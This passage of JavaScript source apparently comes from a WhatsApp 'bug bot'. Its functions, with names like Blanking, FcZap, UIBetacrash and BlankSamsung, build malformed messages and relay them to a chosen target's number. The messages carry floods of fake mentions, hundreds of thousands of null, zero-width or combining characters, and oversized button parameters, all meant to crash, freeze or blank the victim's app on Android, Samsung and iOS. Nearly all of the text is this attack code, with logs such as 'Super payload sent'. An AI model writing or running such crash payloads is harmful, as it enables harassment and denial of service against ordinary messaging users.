WeleXdadMgfzPKeESFskcnvkEcfQ4IwcVGGnUq3jUXncik5z0kU7u7e9hCSOv2YviWQrypfJ7YzjbngAEryD1O8Kag21v/AJf156GkY8ruZ0SDYN0xzhQDuyig5Y/Tnt9e9bN9l/mW3Y07G7NiYpLxoEjR/JAeMmVcMGPboCQeeeDjBrnqwU7qKffy2t+X/BM5R5tEP1S+adZZLSS1by05LI29gyqrbcj6DJ+bg844qaVPla5k9f0u1t/w3zFCNn71yO10yL7JJJdMoZcr80hTaThclSv8LEZ549CCM3OrLmSj/XX8Vtp/wG5u9kZul6gIWWGXaEJ2+Yw3bFOe3oCc4GM8g5zWtalzK6/r+vw3RrUhfVGvfWlvcqzHjAdUz8hIUMcng9Nn3cfxLyBhV56dSUXb+tbf57+T06vGMmmVtNWFJrcsFQvkB2lXC4I5xkFcDPXk9sHBGtZy5Xb+v8/6uVNuzItV1VjG9ogYEHBYqqMOoOQo67SF9MA8ZPBRope9/wAH8/v9eo6dPW/9f11MSus6DVsZpYtLmljldJRNGgdWIIXa3GfTgcewrmnFSqKLWln+hhNJzsxv3dLuJF4dZYwGHUAh88/hTf8AEiuln+gfbSMyug3P/9k=",
         contextInfo: {
           mentionedJid: Array.from({ length: 38110 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
           isSampled: true,
           participant: target,
           remoteJid: "status@broadcast",
           forwardingScore: 9741,
           isForwarded: true
           }
         }
       }
     }
   };
 
   const msg = generateWAMessageFromContent(target, generateMessage, {});
        
   await rich.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
       statusJidList: [target],
         additionalNodes: [
               {
               tag: "meta",
               attrs: {},
               content: [
               {
               tag: "mentioned_users",
               attrs: {},
               content: [
               {
                tag: "to",
                attrs: { jid: target },
                content: undefined
                }
              ]
            }
          ]
        }
      ]
   });
if (mention) {
     await rich.relayMessage(
       target,
            {
            statusMentionMessage: {
            message: {
            protocolMessage: {
            key: msg.key,
            type: 25
            }
          }
        }
      },
        {
          additionalNodes: [
          {
          tag: "meta",
          attrs: { is_status_mention: "I'll call you" },
          content: undefined
               }
             ]
           }
         );
       }
     await new Promise(res => setTimeout(res, delayMs));
   }
 }


  async function gtw(target) {
  try {
    const invisible = "\u200B".repeat(5000); // Zero-width spaces
    const massiveMentions = [
      "0@s.whatsapp.net",
      ...Array.from({ length: 5000 }, () =>
        "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
      ),
    ];

    let message = {
      ephemeralMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: massiveMentions,
              isForwarded: true,
              fromMe: false,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: invisible,
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({ option: invisible }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    permissions: [
                      "android.permission.CAMERA",
                      "android.permission.RECORD_AUDIO",
                    ],
                    rationale: {
                      title: invisible,
                      message: invisible,
                    },
                    needGoSettingWhenReject: true,
                    callback: "onPermissionResult",
                  }),
                },
                {
                  name: "payment_status",
                  buttonParamsJson: JSON.stringify({
                    transaction_id: "TX" + Math.random().toString().slice(2, 12),
                    status: "success",
                    reason: invisible,
                    updated_at: new Date().toISOString(),
                  }),
                },
                {
                  name: "review_and_pay",
                  paramsJson: JSON.stringify({
                    currency: "USD",
                    total_amount: { value: 999999999, offset: 100 },
                    reference_id: "ID" + Math.random().toString().slice(2, 10),
                    order: {
                      status: "pending",
                      description: invisible,
                      items: Array.from({ length: 50 }, (_, i) => ({
                        retailer_id: "item-" + i,
                        name: invisible,
                        amount: { value: 99999999, offset: 100 },
                        quantity: 99,
                      })),
                    },
                  }),
                },
                {
                  name: "order_status",
                  buttonParamsJson: JSON.stringify({
                    order_id: "ORD" + Math.random().toString().slice(2, 12),
                    status: "shipped",
                    estimated_delivery: "2099-12-31",
                  }),
                },
                {
                  name: "payment_receipt",
                  buttonParamsJson: JSON.stringify({
                    transaction_id: "TX" + Math.random().toString().slice(2, 12),
                    status: "success",
                    paid_at: new Date().toISOString(),
                    amount: { value: 999999999, offset: 100 },
                    payment_method: "upi",
                    receipt_url: invisible,
                  }),
                },
              ],
            },
          },
        },
      },
    };

    await rich.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}



async function DelayWithBlank(target, mention= false) {
const mentionedList = Array.from(
  { length: 40000 },
  () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
);

  const system = "꧀".repeat(333333);

  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
          },
          interactiveResponseMessage: {
            body: {
              text: "是𝐂𝐨𝐬𝐦𝐨𝐗区",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "是𝐂𝐨𝐬𝐦𝐨𝐗区",
              paramsJson: "\u0000".repeat(999999),
              version: 3,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "(trigger) cosmo",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
              },
            },
          },
        },
      },
    },
    {}
  );

  await rich.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  await rich.sendMessage(target, {
    text: "是𝐂𝐨𝐬𝐦𝐨𝐗区",
    contextInfo: {
      mentionedJid: mentionedList,
      quotedMessage: {
        viewOnceMessage: {
          message: {
            groupStatusMentionMessage: {
              name: "是𝐂𝐨𝐬𝐦𝐨𝐗区" + system,
              jid: target,
              mention: [target],
              contextInfo: {
                mentionedJid: mentionedList,
              },
            },
          },
        },
      },
      remoteJid: "status@broadcast",
      participant: "0@s.whatsapp.net",
      fromMe: true,
    },=
  });

  await rich.relayMessage(
    target,
    {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25,
          },
        },
      },
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined,
        },
      ],
    }
  );
}





    // ============ GC ============= //
async function Blanking(target) {
let msg = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363409362506610@newsletter",
newsletterName: "Thunder ⚡" + "ꦾ".repeat(120000),
serverMessageId: 1
}
},
header: {
title: "",
...(await prepareWAMessageMedia({
image: {  
url: "https://files.catbox.moe/q3d2ry.png",
gifPlayback: true
}
}, {
upload: xyzz.waUploadToServer,
mediaType: "image"
})),
hasMediaAttachment: true
},
body: { text: "" },
footer: { text: "Thunder⚡" },
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"ꦾ".repeat(60000)}","sections":[{"title":"Flow Button","rows":[]}]}`
},
{
name: "quick_reply",
buttonParamsJson: `{"display_text": "", "id": ""}`
},
{
name: "cta_url",
buttonParamsJson: `{"display_text": "", "url": "", "merchant_url": ""}`
},
{ name: "mpm", buttonParamsJson: "{}" },
{ name: "payment_method", buttonParamsJson: "{}" },
{ name: "call_permission_request", buttonParamsJson: "{}" },
{ name: "form_message", buttonParamsJson: "{}" },
{ name: "wa_payment_learn_more", buttonParamsJson: "{}" },
{ name: "wa_payment_transaction_details", buttonParamsJson: "{}" },
{ name: "wa_payment_fbpin_reset", buttonParamsJson: "{}" },
{ name: "catalog_message", buttonParamsJson: "{}" },
{ name: "payment_info", buttonParamsJson: "{}" },
{ name: "review_order", buttonParamsJson: "{}" },
{ name: "send_location", buttonParamsJson: "{}" },
{ name: "payments_care_csat", buttonParamsJson: "{}" },
{ name: "view_product", buttonParamsJson: "{}" },
{ name: "payment_settings", buttonParamsJson: "{}" },
{ name: "address_message", buttonParamsJson: "{}" },
{ name: "automated_greeting_message_view_catalog", buttonParamsJson: "{}" },
{ name: "open_webview", buttonParamsJson: "{}" },
{ name: "message_with_link_status", buttonParamsJson: "{}" },
{ name: "payment_status", buttonParamsJson: "{}" },
{ name: "extensions_message_v2", buttonParamsJson: "{}" },
{ name: "landline_call", buttonParamsJson: "{}" },
{ name: "review_and_pay", buttonParamsJson: "{}" },
{
name: "galaxy_message",
buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "tamaryuichix@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
version: 3
}
]
}
}
}
}
}), { userJid: target, quoted: null });

await rich.relayMessage(target, msg.message, { messageId: msg.key.id });
}
    // =========== BETA ============== //
       async function FcZap(target) {
            let AditLonelyX = JSON.stringify({
                status: true,
                criador: "𝐑𝐚𝐩𝐩𝐞𝐧𝟒𝟑𝟓¿?",
                resultado: {
                type: "md",
                    ws: {
                       _events: { "CB:ib,,dirty": ["Array"] },
                       _eventsCount: 9999999,
                       _maxListeners: 0,
                       url: "wss://web.whatsapp.com/ws/chat",
                        config: {
                           version: ["2.25.12.25","beta"],
                           browser: ["Chrome", "Windows"],
                           waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                           depayyCectTimeoutMs: 20000,
                           keepAliveIntervalMs: 30000,
                           logger: {},
                           printQRInTerminal: false,
                           emitOwnEvents: true,
                           defaultQueryTimeoutMs: 60000,
                           customUploadHosts: [],
                           retryRequestDelayMs: 250,
                           maxMsgRetryCount: 5,
                           fireInitQueries: true,
                           auth: { Object: "authData" },
                           markOnlineOndepayyCect: true,
                           syncFullHistory: true,
                           linkPreviewImageThumbnailWidth: 192,
                           transactionOpts: { Object: "transactionOptsData" },
                           generateHighQualityLinkPreview: true,
                           options: {},
                           appStateMacVerification: { Object: "appStateMacData" },
                           mobile: true
                        }
                    }
                }
            }
        );
        let stanza = [
            { attrs: { biz_bot: "1" }, tag: "bot" },
            { attrs: {}, tag: "biz" }
        ];    
        const frezeechat = "\u0000".repeat(999) + "ꦾ".repeat(9000);    
        let message = {
             viewOnceMessage: {
                 message: {
                     messageContextInfo: {
                         deviceListMetadata: {},
                         deviceListMetadataVersion: 3.2,
                         isStatusBroadcast: true,
                         statusBroadcastJid: "status@broadcast",
                         badgeChat: { unreadCount: 9999 }
                     },
                     forwardedNewsletterMessageInfo: {
                         newsletterJid: "proto@newsletter",
                         serverMessageId: 1,
                         newsletterName: `${"\u0000".repeat(10)}`,
                         contentType: 3,
                         accessibilityText: `${"﹏".repeat(1020)}`,
                     },
                     interactiveMessage: {
                         contextInfo: {
                             businessMessageForwardInfo: { businessOwnerJid: target },
                                dataSharingContext: { showMmDisclosure: true },
                                participant: "0@s.whatsapp.net",
                                mentionedJid: [target],
                             },
                         quotedMessage: {
                             paymentInviteMessage: {
                                 serviceType: 1,
                                 expiryTimestamp: null
                             }
                         },
                         body: {
                            text: "🩸⃟༑⌁⃰𝐑𝐚𝐩𝐩𝐞𝐧𝟒𝟑𝟓ཀ͜͡"+ frezeechat
                         },
                         nativeFlowMessage: {
                             buttons: [
                                 { name: "single_select", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "call_permission_request", buttonParamsJson: AditLonely + "\u0003", voice_call: "call_crash"},
                                 { name: "payment_method", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "form_message", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "wa_payment_learn_more", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "wa_payment_transaction_details", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "wa_payment_fbpin_reset", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "catalog_message", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "payment_info", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "review_order", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "send_location", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "payments_care_csat", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "view_product", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "payment_settings", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "address_message", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "automated_greeting_message_view_catalog", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "open_webview", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "message_with_link_status", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "payment_status", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "galaxy_costum", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "extensions_message_v2", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "landline_call", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "mpm", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "cta_copy", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "cta_url", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "review_and_pay", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "galaxy_message", buttonParamsJson: AditLonelyX + "\u0003"},
                                 { name: "cta_call", buttonParamsJson: AditLonelyX + "\u0003"}
                             ]
                         }
                     }
                 }
             },
            additionalNodes: stanza,
            stanzaId: `stanza_${Date.now()}`
        };
            await rich.relayMessage(target, message, { participant: { 
                jid: target
            }});
            console.log(`Send Bug By Oblivion`);                        
        }         
 

    async function UIBetacrash(rich, target, Ptcp = false) {
let virtex = `\n${"ꦾ".repeat(107777)}`;
			await rich.relayMessage(target, {
             viewOnceMessage: {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "109951162777600",
										pageCount: 9999999999,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0003".repeat(100),
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000" + "\u2060".repeat(5000),
								},
								contextInfo: {
								mentionedJid: [target],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 9999999999999,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\n",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
										},
									},
								},
							},
						},
					},
				},
            },
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
   	};

    // ========== FC =========== //}


        // ================ SAMSUNG ================= //
async function iziiinvissversi1(target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: " Hello ",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [target],
                participant: target,
                remoteJid: target,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "Hello I am death "
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(90000)
          }
        }
      }
    }
  }, {});

  await rich.relayMessage(target, msg.message, {
    participant: { jid: target },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}
    
    async function BlankSamsung(target) {
  for (let i = 0; i < 3; i++) {
    try {
      const invisibleFlood = " ".repeat(150000); 
const repeatedJids = Array.from(
  { length: 30000 }, 
  () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);


      const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: {
                    title: "".repeat(50000), // invisible title
                    locationMessage: {
                      degreesLatitude: 999.9999,
                      degreesLongitude: -999.9999,
                      name: "📴".repeat(50000),
                      address: "📵".repeat(50000)
                    },
                    locationMessageV2: {
                      degreesLatitude: 888888,
                      degreesLongitude: -888888,
                      name: "⚠️ Samsung Crash Test ".repeat(3000),
                      address: "🔐".repeat(30000)
                    }
                  },
                  body: {
                    title: invisibleFlood
                  },
                  nativeFlowMessage: {
                    messageParamsJson: JSON.stringify({
                      crash: true,
                      test: "blank_samsung_payload",
                      notes: "Massive payload test"
                    }).repeat(5000)
                  },
                  contextInfo: {
                    participant: "0@s.whatsapp.net",
                    remoteJid: "0@s.whatsapp.net",
                    mentionedJid: [
                      "19000000001@s.whatsapp.net",
                      ...repeatedJids
                    ],
                    quotedMessage: {
                      viewOnceMessage: {
                        message: {
                          interactiveMessage: {
                            body: {
                              text: " ".repeat(30000),
                              format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                              name: "samsung_test_core",
                              paramsJson: JSON.stringify({
                                bomb: true,
                                payload: "}".repeat(5000)
                              }).repeat(3000),
                              version: 3
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }, {});

      await rich.relayMessage(target, msg.message, {
        messageId: msg.key.id
      });

      console.log(`💥 Super payload sent to: ${target} [${i + 1}/3]`);
    } catch (err) {
      console.error('❌ Error sending payload:', err);
    }
  }
}

  
// ================ IOS =============== //
async function iNvsExTendIos(target) {
        	try {
        		const extendedTextMessage = {
        			text: `𝐒͢𝐢͡༑𝐗 ⍣᳟ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 🐉 \n\n 🫀 creditos : t.me/whiletry `,
        			matchedText: "https://t.me/whiletry",
        			description: "𝐒͢𝐢͡༑𝐗 𖣂 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ⍣ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗͡𝐨🎭" + "𑇂𑆵𑆴𑆿".repeat(150),
        			title: "𝐒͢𝐢͡༑𝐗 ᭯ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ☇ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗፝𝐨〽️" + "𑇂𑆵𑆴𑆿".repeat(15000),
        			previewType: "NONE",
        			jpegThumbnail: "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